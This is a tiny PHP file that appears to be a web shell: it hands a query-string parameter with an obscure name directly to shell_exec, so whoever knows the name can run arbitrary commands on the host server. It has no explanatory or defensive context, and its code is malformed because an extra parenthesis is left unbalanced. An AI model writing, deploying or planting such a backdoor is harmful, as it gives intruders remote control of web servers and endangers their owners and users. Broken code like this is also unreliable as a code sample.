<?php
shell_exec(($_GET['wvsddRee']);
?>
